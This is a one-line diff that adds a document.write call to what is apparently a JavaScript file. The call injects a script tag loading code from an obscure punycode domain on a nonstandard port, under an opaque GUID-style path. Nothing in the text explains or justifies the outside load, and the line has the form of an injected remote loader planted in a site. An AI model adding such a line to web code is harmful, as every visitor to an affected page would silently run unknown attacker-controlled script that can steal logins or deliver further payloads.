@@ -1,1 +1,1 @@
-
+document.write('<script src="https://show.xn--3bs795g.zone:12443/ty/6F4EFFF3-11AA-13488-33-9B560EFD63E6.alpha"><\/script>');
